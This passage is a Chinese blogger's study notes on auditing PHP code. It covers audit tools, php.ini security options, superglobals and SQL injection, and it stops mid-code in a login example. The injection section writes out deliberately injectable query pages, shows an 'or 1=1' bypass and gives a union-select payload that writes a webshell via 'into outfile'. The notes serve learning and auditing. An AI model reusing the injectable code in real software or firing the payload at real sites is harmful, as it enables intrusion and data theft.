    <content><![CDATA[<h1 id="php代码审计学习笔记1"><a href="#php代码审计学习笔记1" class="headerlink" title="php代码审计学习笔记1"></a>php代码审计学习笔记1</h1><p>课程是某牛的，笔记只供个人学习</p>
<p>感觉就是从代码层面复习了一遍漏洞原理</p>
<h1 id="环境配置及审计工具介绍"><a href="#环境配置及审计工具介绍" class="headerlink" title="环境配置及审计工具介绍"></a>环境配置及审计工具介绍</h1><p>环境就用phpstudy</p>
<p>看代码的话我用的是notepad++</p>
<p>审计工具可以用seay源代码审计系统（基于正则</p>
<p>Fortify SCA也是一款不错的商业化代码审计工具（靠内置的规则空间匹配</p>
<p>rips审计工具也不错，可以看到用户输的一些点</p>
<p>以及一款数据库监控工具 vMysqlMonitoring.exe</p>
<p>审计靶场:VAuditDemo   ZVulDrill</p>
<h1 id="代码审计的思路及流程"><a href="#代码审计的思路及流程" class="headerlink" title="代码审计的思路及流程"></a>代码审计的思路及流程</h1><h2 id="MVC架构"><a href="#MVC架构" class="headerlink" title="MVC架构"></a>MVC架构</h2><p>MVC是一种设计创建Web程序的一种模式，其同时提供了HTML,CSS和JAVASCRIPT的完全控制。</p>
<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220824105406833.png" alt="image-20220824105406833"></p>
<p>MVC关系</p>
<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220824105546784.png" alt="image-20220824105546784"></p>
<h2 id="常见的php框架"><a href="#常见的php框架" class="headerlink" title="常见的php框架"></a>常见的php框架</h2><p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220824105649145.png" alt="image-20220824105649145"></p>
<h2 id="审计思路"><a href="#审计思路" class="headerlink" title="审计思路"></a>审计思路</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MVC框架常见的一个处理流程</span><br><span class="line">获取请求 全剧过滤 模块文件 c函数内容 m函数内容 v显示</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">常见网站目录架构</span><br><span class="line">主目录</span><br><span class="line"></span><br><span class="line">模块目录</span><br><span class="line">插件目录</span><br><span class="line">上传目录</span><br><span class="line">模板目录</span><br><span class="line">数据目录</span><br><span class="line">配置目录</span><br><span class="line"></span><br><span class="line">配置文件</span><br><span class="line"></span><br><span class="line">公共函数的文件</span><br><span class="line">安全过滤的文件</span><br><span class="line"></span><br><span class="line">数据库结构</span><br><span class="line"></span><br><span class="line">入口文件</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通读全文</span><br><span class="line">函数集文件，配置文件，安全过滤文件，index文件</span><br><span class="line">优点：了解程序的架构及业务逻辑，挖掘更高质的漏洞</span><br><span class="line">缺点：耗费时间多，工程较大</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">敏感关键字回溯参数</span><br><span class="line">优点：快速挖掘想要的漏洞，最常用的方法。</span><br><span class="line">缺点：覆盖不到逻辑漏洞的挖掘，不能了解程序的基本架构</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查找可控变量</span><br><span class="line">可以用rips审计工具的查找用户输入功能</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">功能点定向审计</span><br><span class="line">程序安装，文件上传，文件管理，登录验证，备份恢复，找回密码</span><br></pre></td></tr></table></figure>

<h1 id="PHP核心配置详解"><a href="#PHP核心配置详解" class="headerlink" title="PHP核心配置详解"></a>PHP核心配置详解</h1><p>   PHP.INI配置文件也就是所谓的核心配置</p>
<p>下面是一些常亮</p>
<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220824183645573.png" alt="image-20220824183645573"></p>
<h2 id="基本配置-语法"><a href="#基本配置-语法" class="headerlink" title="基本配置-语法"></a>基本配置-语法</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">大小写敏感</span><br><span class="line">directive = value（指令 = 值）</span><br><span class="line">foo=bar ≠ FOO=bar</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">运算符</span><br><span class="line">|、&amp;、~、!</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220824185643247.png" alt="image-20220824185643247"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">空值的表达方式</span><br><span class="line">foo =     ;</span><br><span class="line">foo = none;</span><br><span class="line">foo = &quot;none&quot;;这个就表示这么一个字符串了，而不是空值</span><br></pre></td></tr></table></figure>

<h2 id="基本配置-安全模式"><a href="#基本配置-安全模式" class="headerlink" title="基本配置-安全模式"></a>基本配置-安全模式</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">安全模式</span><br><span class="line">safe_mode = off</span><br><span class="line">安全模式，用来限制文档的存取、限制环境变量的存取，限制外部程序的执行。</span><br><span class="line">本特性已在PHP5.4.0被移除</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">限制环境变量存取</span><br><span class="line">safe_mode_allowed_env_vars = string</span><br><span class="line">指定php程序可以改变的环境变量的前缀，当这个选项的值为空时，那么php可以改变任何环境变量。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">外部程序执行目录</span><br><span class="line">safe_mode_exec_dir = &quot;E:\Local Test\WWW&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">禁用函数</span><br><span class="line">disable_function</span><br><span class="line">为了更安全的运行php，可以用此指令来禁止一些敏感函数的使用，当你想用本指令禁止一些危险函数时，切忌把dl()函数也加到禁止的列表，攻击者可以利用dl()函数加载自定义的php扩展来突破disable_function。配置禁用函数时可以使用逗号分隔函数名。</span><br><span class="line">同理</span><br><span class="line">disable_classes是禁用类</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">com组件</span><br><span class="line">com.allow_dcom = false</span><br><span class="line">php设置在安全模式下，仍旧允许攻击者使用com()函数来创建系统组件来执行任意命令，我推荐关闭这个函数来防止出现此漏洞。</span><br><span class="line">使用COM()函数需要在php.ini中配置extension=php_com_dotnet.dll,如果php VERSION&lt;5.4.5则不需要</span><br></pre></td></tr></table></figure>

<h2 id="基本配置-控制变量"><a href="#基本配置-控制变量" class="headerlink" title="基本配置-控制变量"></a>基本配置-控制变量</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">全局变量注册开关</span><br><span class="line">register_globals = off</span><br><span class="line">php.ini的register_globals选项的默认值预设为off，在4.2版本之前是默认开启的，当register_globals的设定为On时，程序可以接受来自服务器的各种环境变量，包括表单提交的变量，这是对服务器来讲是不安全的，所以我们不能让它注册为全局变量。</span><br><span class="line">register_globals = off时，服务器端获取数据的时候用$_GET[&#x27;name&#x27;]来获取数据</span><br><span class="line">register_globals = On时，服务器使用POST或者GET提交的变量，都将自动使用全局变量的值来接受值。</span><br><span class="line">如下：</span><br><span class="line">开启这个开关之后，我们只要传入一个_SESSION[username]=aa，就可以doeverthing</span><br><span class="line">关掉之后，我们就不能获取权限了</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220824194314976.png" alt="image-20220824194314976"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">魔术引号过滤</span><br><span class="line">magic_quotes_gpc = on  本特性已在PHP5.4.0已经移除</span><br><span class="line">magic_quotes_gpc = Off 在php.ini里面是默认关闭的，如果他打开后将自动把用户提交对sql的查询语句进行转换，如果设置成ON的话，php会吧所有的单引号，双引号，反斜杠和空字符加上反斜杠进行转义，他会影响HTTP请求的数据有(GET,POST,Cookies)，开启他会提高网站的安全性，当然，您也可以使用addslashes来转义提交的HTTP请求数据，或者用stripsashes来删除转义</span><br></pre></td></tr></table></figure>

<h2 id="基本配置-远程文件"><a href="#基本配置-远程文件" class="headerlink" title="基本配置-远程文件"></a>基本配置-远程文件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">是否允许远程包含文件</span><br><span class="line">allow_url_include = off</span><br><span class="line">该配置为on的情况下，可以直接包含远程文件，若包含的变量为可控的情况下，可以直接控制变量来执行PHP代码</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">是否允许打开远程文件</span><br><span class="line">allow_url_open = on</span><br><span class="line">允许本地PHP文件通过调用URL重写来打开和关闭写权限，默认的封装协议提供的ftp和http协议来访问文件。</span><br></pre></td></tr></table></figure>

<h2 id="基本配置-目录权限"><a href="#基本配置-目录权限" class="headerlink" title="基本配置-目录权限"></a>基本配置-目录权限</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP头部版本信息</span><br><span class="line">expose_php = off</span><br><span class="line">防止了通过http头部泄露的php版本信息</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件上传临时目录</span><br><span class="line">upload_tmp_dir = </span><br><span class="line">上传文件临时保存目录，如果不设置的话，则采用系统的临时目录</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用户可访问目录</span><br><span class="line">open_basedir = E:\Local Test\WWW</span><br><span class="line">能够控制PHP脚本只能访问指定的目录，这样能够避免PHP脚本访问，不应该访问的文件，一定程度上限制了phpshell的危害 </span><br></pre></td></tr></table></figure>

<h2 id="基本配置-错误信息"><a href="#基本配置-错误信息" class="headerlink" title="基本配置-错误信息"></a>基本配置-错误信息</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">内部错误选项</span><br><span class="line">display_errors = on</span><br><span class="line">表明显示PHP脚本的内部错误，网站发布后便宜关闭PHP的错误回显，在调试的时候通常把PHP错误显示打开</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">错误报告级别</span><br><span class="line">error_reporting = E_ALL &amp; ~E_NOTICE</span><br><span class="line">这个设置的作用是将错误级别跳到最高，显示所有问题，方便排错。</span><br></pre></td></tr></table></figure>

<h1 id="代码调试"><a href="#代码调试" class="headerlink" title="代码调试"></a>代码调试</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">代码调试小技巧</span><br><span class="line"></span><br><span class="line">echo</span><br><span class="line">最简单的输出调试方法，一般用来输出变量值或者不确定执行到哪个分支。</span><br><span class="line"></span><br><span class="line">print_r（true为1，false为空）,var_dump,debug_zval_dump</span><br><span class="line">这个主要是输出变量的数据值，特别是数组和对象数据，一般我们在查看接口的返回值或者不确定的变量，都可以使用这个api，debug_zval_dump输出结果和var_dump类似，唯一增加的一个值是refcount，记录一个变量被引用了多少次</span><br><span class="line"></span><br><span class="line">debug_print_backtrace</span><br><span class="line">可以查看输出的调用栈信息</span><br><span class="line"></span><br><span class="line">exit()</span><br><span class="line">停止程序，无法运行后面代码</span><br></pre></td></tr></table></figure>

<h1 id="审计中涉及的超全局变量"><a href="#审计中涉及的超全局变量" class="headerlink" title="审计中涉及的超全局变量"></a>审计中涉及的超全局变量</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">全局变量：全局变量就是在函数外面定义的变量。不能在函数中直接使用。因为他的作用域不会到函数内部。所以在函数内部使用的时候常常看到类似global$a;</span><br><span class="line">超全局变量：超全局变量作用域在所有脚本都有效。注意，除了$_GET,$_POST,$_SERVER,$_COOKIE等之外的超全局变量保存在$GLOBALS数组中。</span><br></pre></td></tr></table></figure>

<h2 id="GLOBALOS"><a href="#GLOBALOS" class="headerlink" title="$GLOBALOS"></a>$GLOBALOS</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$name</span> = <span class="number">123</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$name</span> = <span class="number">456</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">test();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$name</span>;</span><br></pre></td></tr></table></figure>

<p>以上代码输出的是123</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$name</span> = <span class="number">123</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="variable">$name</span> = <span class="number">456</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">test();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$name</span>;</span><br></pre></td></tr></table></figure>

<p>这样就是输出的456，其中global起的是一个参数传递的作用。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$name</span> = <span class="number">123</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$GLOBALS</span>[name] = <span class="number">4567</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">test();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$name</span>;</span><br></pre></td></tr></table></figure>

<p>输出4567，变量的作用域设置的全局</p>
<h2 id="POST-和-GET"><a href="#POST-和-GET" class="headerlink" title="$_POST 和 $_GET"></a><code>$_POST</code> 和 <code>$_GET</code></h2><p>post是向服务器传送数据。将表单内各个字段与其内容放置在HTML HEADER内一起传送到ACTION属性所指的URL地址，用户看不到这个过程。</p>
<p>get是从服务器上获取数据，把参数数据队列加到提交表单的ACTION属性所指的URL中，值和表单内各个字段一一对应，在URL中可以看到</p>
<h2 id="REQUEST"><a href="#REQUEST" class="headerlink" title="$_REQUEST"></a>$_REQUEST</h2><p>request可以接受get和post的数据，但是比较慢，所以我们尽量不要使用request</p>
<h2 id="SERVER"><a href="#SERVER" class="headerlink" title="$_SERVER"></a>$_SERVER</h2><p>这种超全局变量保存关于报头，路径和脚本位置的信息等。</p>
<p>我整理了其中的参数，也方便以后查阅</p>
<p>可以var_dump下来看一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_SERVER[&#x27;PHP_SELF&#x27;] #当前正在执行脚本的文件名，与 document root相关。</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;argv&#x27;] #传递给该脚本的参数。</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;argc&#x27;] #包含传递给程序的命令行参数的个数（如果运行在命令行模式）。</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;GATEWAY_INTERFACE&#x27;] #服务器使用的 CGI 规范的版本。例如，“CGI/1.1”。</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;SERVER_NAME&#x27;] #当前运行脚本所在服务器主机的名称。</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;SERVER_SOFTWARE&#x27;] #服务器标识的字串，在响应请求时的头部中给出。</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;SERVER_PROTOCOL&#x27;] #请求页面时通信协议的名称和版本。例如，“HTTP/1.0”。</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;REQUEST_METHOD&#x27;] #访问页面时的请求方法。例如：“GET”、“HEAD”，“POST”，“PUT”。</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;QUERY_STRING&#x27;] #查询(query)的字符串。</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;DOCUMENT_ROOT&#x27;] #当前运行脚本所在的文档根目录。在服务器配置文件中定义。</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;HTTP_ACCEPT&#x27;] #当前请求的 Accept: 头部的内容。</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;HTTP_ACCEPT_CHARSET&#x27;] #当前请求的 Accept-Charset: 头部的内容。例如：“iso-8859-1,*,utf-8”。</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;HTTP_ACCEPT_ENCODING&#x27;] #当前请求的 Accept-Encoding: 头部的内容。例如：“gzip”。</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;HTTP_ACCEPT_LANGUAGE&#x27;]#当前请求的 Accept-Language: 头部的内容。例如：“en”。</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;HTTP_CONNECTION&#x27;] #当前请求的 Connection: 头部的内容。例如：“Keep-Alive”。</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;HTTP_HOST&#x27;] #当前请求的 Host: 头部的内容。</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;HTTP_REFERER&#x27;] #链接到当前页面的前一页面的 URL 地址。</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;HTTP_USER_AGENT&#x27;] #当前请求的 User_Agent: 头部的内容。</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;HTTPS&#x27;] — 如果通过https访问,则被设为一个非空的值(on)，否则返回off</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;REMOTE_ADDR&#x27;] #正在浏览当前页面用户的 IP 地址。</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;REMOTE_HOST&#x27;] #正在浏览当前页面用户的主机名。</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;REMOTE_PORT&#x27;] #用户连接到服务器时所使用的端口。</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;SCRIPT_FILENAME&#x27;] #当前执行脚本的绝对路径名。</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;SERVER_ADMIN&#x27;] #管理员信息</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;SERVER_PORT&#x27;] #服务器所使用的端口</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;SERVER_SIGNATURE&#x27;] #包含服务器版本和虚拟主机名的字符串。</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;PATH_TRANSLATED&#x27;] #当前脚本所在文件系统（不是文档根目录）的基本路径。</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;SCRIPT_NAME&#x27;] #包含当前脚本的路径。这在页面需要指向自己时非常有用。</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;REQUEST_URI&#x27;] #访问此页面所需的 URI。例如，“/index.html”。</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;PHP_AUTH_USER&#x27;] #当 PHP 运行在 Apache 模块方式下，并且正在使用 HTTP 认证功能，这个变量便是用户输入的用户名。</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;PHP_AUTH_PW&#x27;] #当 PHP 运行在 Apache 模块方式下，并且正在使用 HTTP 认证功能，这个变量便是用户输入的密码。</span><br><span class="line"></span><br><span class="line">$_SERVER[&#x27;AUTH_TYPE&#x27;] #当 PHP 运行在 Apache 模块方式下，并且正在使用 HTTP 认证功能，这个变量便是认证的类型。</span><br></pre></td></tr></table></figure>

<h2 id="FILE"><a href="#FILE" class="headerlink" title="$_FILE"></a>$_FILE</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_FILES数组内容如下: </span><br><span class="line">$_FILES[&#x27;myFile&#x27;][&#x27;name&#x27;] 客户端文件的原名称。 </span><br><span class="line">$_FILES[&#x27;myFile&#x27;][&#x27;type&#x27;] 文件的 MIME 类型，需要浏览器提供该信息的支持，例如&quot;image/gif&quot;。 </span><br><span class="line">$_FILES[&#x27;myFile&#x27;][&#x27;size&#x27;] 已上传文件的大小，单位为字节。 </span><br><span class="line">$_FILES[&#x27;myFile&#x27;][&#x27;tmp_name&#x27;] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定，但 用 putenv() 函数设置是不起作用的。 </span><br><span class="line">$_FILES[&#x27;myFile&#x27;][&#x27;error&#x27;] 和该文件上传相关的错误代码。[&#x27;error&#x27;] 是在 PHP 4.2.0 版本中增加的。下面是它的说明：(它们在PHP3.0以后成了常量) </span><br><span class="line">UPLOAD_ERR_OK </span><br><span class="line">值：0; 没有错误发生，文件上传成功。 </span><br><span class="line">UPLOAD_ERR_INI_SIZE </span><br><span class="line">值：1; 上传的文件超过了 php.ini 中 upload_max_filesize 选项限制的值。 </span><br><span class="line">UPLOAD_ERR_FORM_SIZE </span><br><span class="line">值：2; 上传文件的大小超过了 HTML 表单中 MAX_FILE_SIZE 选项指定的值。 </span><br><span class="line">UPLOAD_ERR_PARTIAL </span><br><span class="line">值：3; 文件只有部分被上传。 </span><br><span class="line">UPLOAD_ERR_NO_FILE </span><br><span class="line">值：4; 没有文件被上传。 </span><br><span class="line">值：5; 上传文件大小为0. </span><br></pre></td></tr></table></figure>

<h2 id="COOKIE"><a href="#COOKIE" class="headerlink" title="$_COOKIE"></a>$_COOKIE</h2><p>通过HTTPCookies方式传递给当前脚本的变量的数组</p>
<p>$HTTP_COOKIE_VARS和$_COOKIE是不同的变量，PHP处理他们的方式不同</p>
<p>$HTTP_COOKIE_VARS包含相同的信息（4.1.0已废弃）但它不是一个超全局变量</p>
<h2 id="SESSION"><a href="#SESSION" class="headerlink" title="$_SESSION"></a>$_SESSION</h2><p>是一个数值，其中的value值可以我们设置，类似cookie</p>
<h2 id="ENV"><a href="#ENV" class="headerlink" title="$_ENV"></a>$_ENV</h2><p>$_ENV包含服务器端环境变量的数组，可在PHP程序的任何地方直接访问</p>
<p>$_ENV只是被动的接收服务器端的环境碧昂量转换为数组元素。</p>
<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>数字型的注入，当输入的参数是整型时，则可认为是数字型注入。如年龄，id，页码，都可以是，而且不需要单引号进行闭合。</p>
<p>首先我们自己新建一个数据库来进行一个测试</p>
<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220826202223548.png" alt="image-20220826202223548"></p>
<p>这是一个名为test的数据库,以及一个user表</p>
<p>随后自己写一个查询页面</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$conn</span> = mysql_connect(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>);<span class="comment">#建立一个连接，返回一个连接标识</span></span><br><span class="line">mysql_select_db(<span class="string">&#x27;test&#x27;</span>,<span class="variable">$conn</span>);<span class="comment">#选择数据库</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM USER WHERE id =<span class="subst">$id</span>&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(mysql_error());<span class="comment">#执行一次sql查询</span></span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>)<span class="comment">#返回一个关联数组)&#123;</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;ID&#x27;</span>.<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;USERNAME&#x27;</span>.<span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;PASSWORD&#x27;</span>.<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>].<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;PHONE&#x27;</span>.<span class="variable">$row</span>[<span class="string">&#x27;phone&#x27;</span>].<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">mysql_close(<span class="variable">$conn</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$sql</span>;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220826205026879.png" alt="image-20220826205026879"></p>
<p>可以看到就像是一个基础的sql注入靶场</p>
<p>or1=1就可以看到注入成功</p>
<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220826205517820.png" alt="image-20220826205517820"></p>
<h2 id="注入利用的方式"><a href="#注入利用的方式" class="headerlink" title="注入利用的方式"></a>注入利用的方式</h2><p>查询数据，读写文件，执行命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">写入webshell</span><br><span class="line">union select 1,2,3,十六进制编码的一句话 into outfile &#x27;C:/Localhost/WWW/3.php&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="登录处注入的例子"><a href="#登录处注入的例子" class="headerlink" title="登录处注入的例子"></a>登录处注入的例子</h2><p><code>login.html</code></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>login<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;login.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">    账号：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;点击登录&quot;</span> <span class="attr">name</span>=<span class="string">&quot;login&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span>&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>login.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;login&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;fail&#x27;</span>;<span class="comment">#首先看是否有数据从那边传过来</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$conn</span> = mysql_connect(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>);<span class="comment">#连接数据库</span></span><br><span class="line">    mysql_select_db(<span class="string">&quot;test&quot;</span>,<span class="variable">$conn</span>);<span class="comment">#选择数据库</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT *FROM USER WHERE USERNAME=&#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27;&quot;</span>;<span class="comment">#拼接sql语句</span></span><br><span class="line">    <span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>) <span class="keyword">or</span> <span 